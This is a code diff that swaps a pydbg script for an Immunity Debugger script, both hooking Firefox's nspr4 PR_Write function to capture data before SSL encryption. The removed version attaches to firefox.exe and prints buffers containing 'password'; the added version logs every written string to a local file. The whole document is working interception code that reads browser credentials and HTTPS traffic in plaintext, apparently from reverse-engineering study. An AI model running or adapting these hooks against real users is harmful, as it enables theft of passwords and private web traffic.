@@ -1,62 +1,25 @@
-from pydbg import *
-from pydbg.defines import *
-import utils
-import sys
-dbg 	= pydbg()
-found_firefox = False
-# Let's set a global pattern that we can make the hook
-# search for
+from immlib import *
 
-pattern = "password"
-
-# This is our entry hook callback function
-# the argument we are interested in is args[1]
-def ssl_sniff( dbg, args ):
-# Now we read out the memory pointed to by the second argument
-# it is stored as an ASCII string, so we'll loop on a read until
-# we reach a NULL byte
-        buffer = ""
-        offset = 0
-
-        while 1:
-                byte = dbg.read_process_memory( args[1] + offset, 1 )
-
-                if byte != "\x00":
-                        buffer += byte
-                        offset += 1
-                        continue
-                else:
-                        break
-        if pattern in buffer:
-
-                print "Pre-Encrypted: %s" % buffer
-        return DBG_CONTINUE
-
-# Quick and dirty process enumeration to find firefox.exe
-
-for (pid, name) in dbg.enumerate_processes():
-	if name.lower() == "firefox.exe":
-		found_firefox = True
-		
-	hooks	= utils.hook_container()
-
-	dbg.attach(pid)
-	print "[*] Attaching to firefox.exe with PID: %d" % pid
-# Resolve the function address
-
-	hook_address = dbg.func_resolve_debuggee("nspr4.dll","PR_Write")
-	if hook_address:
-# Add the hook to the container. We aren't interested
-# in using an exit callback, so we set it to None.
-		hooks.add( dbg, hook_address, 2, ssl_sniff, None )
-		print "[*] nspr4.PR_Write hooked at: 0x%08x" % hook_address
-		break
-	else:
-		print "[*] Error: Couldn't resolve hook address."
-		sys.exit(-1)
-if found_firefox:
-	print "[*] Hooks set, continuing process."
-	dbg.run()
-else:
-	print "[*] Error: Couldn't find the firefox.exe process."
-sys.exit(-1)
+class fire (LogBpHook) :
+          def __init__(self):
+                   self.imm=Debugger();
+                   self.logfile = "D:\\fire_log.txt"
+#directory where the log file has to be saved
+                   LogBpHook.__init__(self)
+                  
+          def run(self,regs):
+                   addr=self.imm.readLong(regs['ESP']+8)
+                   str=self.imm.readString(addr)
+                   self.imm.log("PR_Write ( 0x%x) <- %s" % (addr,str) )
+                   fd = open( self.logfile, "a" )
+                   fd.write( str )
+                   fd.close()
+# this function run automatically when hook is hit and function code is #executed which logs it in to file and displays on log window of debugger
+                  
+def main(args) :
+          imm=Debugger()
+          wfun=imm.getAddress("nspr4.PR_Write")
+#setup hook point
+          fire_hook=fire()
+          fire_hook.add( "%08x" % wfun, wfun)
+          return "[*] READY for ACTION"
